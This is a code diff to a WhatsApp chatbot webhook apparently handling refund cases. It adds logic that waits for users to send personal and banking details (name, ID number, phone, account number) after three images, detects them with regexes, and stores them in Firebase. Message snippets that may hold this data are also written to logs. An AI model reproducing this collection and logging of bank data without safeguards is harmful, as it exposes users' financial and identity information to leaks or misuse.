@@ -22,12 +22,50 @@ function normalizeChatId(rawPhone: string): string {
 }
 
 /**
- * Formats a chatId for sending via WHAPI.
- * WHAPI requires the format: phone@s.whatsapp.net
+ * Detects if a message indicates the user will send info soon.
+ * Examples: "ya los envío", "en un momento", "dame un segundo", etc.
  */
-function toWhatsAppId(chatId: string): string {
-  if (chatId.includes('@')) return chatId;
-  return chatId + '@s.whatsapp.net';
+function isUserSayingWillSendSoon(text: string): boolean {
+  const lower = text.toLowerCase().trim();
+  const patterns = [
+    /ya\s+(los?\s+)?env[ií]/,         // "ya los envío", "ya envío"
+    /en\s+un\s+momento/,              // "en un momento"
+    /dame\s+(un\s+)?(momento|segundo|minuto)/, // "dame un momento"
+    /ahorita/,                         // "ahorita"
+    /un\s+(momento|segundo|minuto)/,   // "un momento"
+    /ya\s+v(oy|a)\s/,                 // "ya voy a enviar"
+    /espera/,                          // "espera"
+    /ya\s+cas[iy]/,                    // "ya casi"
+    /lo\s+env[ií]o/,                   // "lo envío"
+    /los?\s+mand[oa]/,                // "los mando"
+    /voy\s+a\s+enviar/,               // "voy a enviar"
+    /voy\s+a\s+mandar/,               // "voy a mandar"
+    /enseguida/,                       // "enseguida"
+    /ya\s+mismo/,                      // "ya mismo"
+    /dame\s+chance/,                   // "dame chance"
+    /un\s+ratico/,                     // "un ratico"
+    /permiso/,                         // "permiso"
+    /déjame/,                          // "déjame buscar"
+    /dejame/,                          // "dejame buscar"
+    /estoy\s+buscando/,               // "estoy buscando"
+    /busco\s+y/,                       // "busco y te envío"
+  ];
+  return patterns.some(p => p.test(lower));
+}
+
+/**
+ * Detects if a message looks like the user is sending their personal/banking data.
+ * Returns true if the message contains at least 2 data indicators.
+ */
+function looksLikeUserData(text: string): boolean {
+  let score = 0;
+  if (/[A-Z][a-záéíóúñ]+\s+[A-Z][a-záéíóúñ]+/.test(text)) score++; // Name pattern
+  if (/\d{5,8}/.test(text)) score++;     // Cedula
+  if (/0\d{10}/.test(text)) score++;     // Phone
+  if (/\d{20}/.test(text)) score++;      // Account number
+  if (/corriente|ahorro/i.test(text)) score++; // Account type
+  if (/cedula|cédula|nombre|cuenta|telefono|teléfono/i.test(text)) score++; // Keywords
+  return score >= 2;
 }
 
 export async function POST(req: NextRequest) {
@@ -63,6 +101,7 @@ export async function POST(req: NextRequest) {
     const chatSnap = await get(child(ref(db), 'chats/' + chatId));
     let oldChat = chatSnap.val() || {};
     let imgCount = oldChat.imageCount || 0;
+    const isWaitingForData = oldChat.waitingForData === true;
     
     if (isImageMsg) {
       imgCount = imgCount + 1;
@@ -87,22 +126,77 @@ export async function POST(req: NextRequest) {
       // Got 3 images! Now reset count and trigger AI to ask for data
       console.log('[IMG] Got 3! Triggering AI to request data...');
       content = '[Sistema: El usuario ha enviado 3 imágenes. Ahora debe pedir los datos personales y bancarios.]';
-      // Reset image count AFTER triggering AI
-      await update(ref(db, 'chats/' + chatId), { imageCount: 0 });
+      // Reset image count and set waitingForData flag
+      await update(ref(db, 'chats/' + chatId), { imageCount: 0, waitingForData: true });
     }
     
-    // Save message
-    const msgData: Message = { id: msgId, chatId, content, sender: 'user', timestamp: Date.now(), status: 'delivered' };
+    // If we're waiting for data and this is NOT the 3-images trigger...
+    if (isWaitingForData && !content.startsWith('[Sistema:')) {
+      
+      // Save the message to Firebase regardless
+      const msgData: Message = { id: msgId, chatId, content, sender: 'user', timestamp: Date.now(), status: 'delivered' };
+      await set(ref(db, 'messages/' + chatId + '/' + msgId), msgData);
+      await update(ref(db, 'chats/' + chatId), { 
+        phone: chatId,
+        lastMessage: content, 
+        lastMessageTime: Date.now(), 
+        unreadCount: (oldChat.unreadCount || 0) + 1 
+      });
+      
+      // Check if user is sending their actual data
+      if (looksLikeUserData(content)) {
+        console.log('[WAITING] User sent data! Processing normally...');
+        // Clear the waiting flag - let it continue to AI processing below
+        await update(ref(db, 'chats/' + chatId), { waitingForData: false });
+        // Fall through to normal AI processing
+      }
+      // Check if user says they'll send soon
+      else if (isUserSayingWillSendSoon(content)) {
+        console.log('[WAITING] User says will send soon, acknowledging briefly...');
+        // Clear waiting flag temporarily to let AI respond, then set it back
+        // Actually, just respond with a brief acknowledgment and keep waiting
+        const briefReply = '¡Perfecto! Sin problema, quedo atenta. Envíame la información cuando la tengas lista. 😊';
+        
+        // Send to WhatsApp
+        await fetch(WHAPI_BASE_URL + '/messages/text', {
+          method: 'POST',
+          headers: { 'Authorization': 'Bearer ' + WHAPI_TOKEN!, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ to: chatId, body: briefReply })
+        });
+        
+        // Save to Firebase
+        const aiId = 'a_' + Date.now();
+        const aiMsg: Message = { id: aiId, chatId, content: briefReply, sender: 'agent', timestamp: Date.now(), status: 'sent' };
+        await set(ref(db, 'messages/' + chatId + '/' + aiId), aiMsg);
+        console.log('[WAITING] Brief acknowledgment sent');
+        
+        return NextResponse.json({ success: true });
+      }
+      // Otherwise, stay silent - just save the message, don't respond
+      else {
+        console.log('[WAITING] Still waiting for data, staying silent. Message:', content.substring(0, 50));
+        return NextResponse.json({ success: true });
+      }
+    }
+    
+    // Save message (only if not already saved in the waitingForData block above)
+    if (!isWaitingForData || content.startsWith('[Sistema:')) {
+      const msgData2: Message = { id: msgId, chatId, content, sender: 'user', timestamp: Date.now(), status: 'delivered' };
+      oldChat = (await get(child(ref(db), 'chats/' + chatId))).val() || {};
+      const aiEnabled2 = oldChat.aiEnabled !== false;
+      await set(ref(db, 'messages/' + chatId + '/' + msgId), msgData2);
+      await update(ref(db, 'chats/' + chatId), { 
+        phone: chatId,
+        lastMessage: content, 
+        lastMessageTime: Date.now(), 
+        unreadCount: (oldChat.unreadCount || 0) + 1, 
+        aiEnabled: aiEnabled2 
+      });
+    }
+    
+    // Re-read chat state for aiEnabled check
     oldChat = (await get(child(ref(db), 'chats/' + chatId))).val() || {};
     const aiEnabled = oldChat.aiEnabled !== false;
-    await set(ref(db, 'messages/' + chatId + '/' + msgId), msgData);
-    await update(ref(db, 'chats/' + chatId), { 
-      phone: chatId,
-      lastMessage: content, 
-      lastMessageTime: Date.now(), 
-      unreadCount: (oldChat.unreadCount || 0) + 1, 
-      aiEnabled 
-    });
     
     // AUTO-REGISTER CASE: If user sends bank data (name + cedula + phone + account)
     const hasName = /[A-Z][a-z]+\s[A-Z][a-z]+/.test(content);
@@ -135,6 +229,8 @@ export async function POST(req: NextRequest) {
         estado_validacion: 'completado'
       };
       await set(ref(db, 'casos_reembolso/' + chatId), caso);
+      // Clear the waiting flag since we got the data
+      await update(ref(db, 'chats/' + chatId), { waitingForData: false });
       console.log('[AUTO] Caso registrado automáticamente');
     }
     
@@ -172,7 +268,7 @@ export async function POST(req: NextRequest) {
       const reply = data.candidates?.[0]?.content?.parts?.[0]?.text;
       
       if (reply) {
-        // Send reply to WhatsApp via WHAPI - use plain phone number (WHAPI accepts both formats)
+        // Send reply to WhatsApp via WHAPI
         console.log('[WHAPI] Sending reply to:', chatId);
         
         const whapiRes = await fetch(WHAPI_BASE_URL + '/messages/text', {
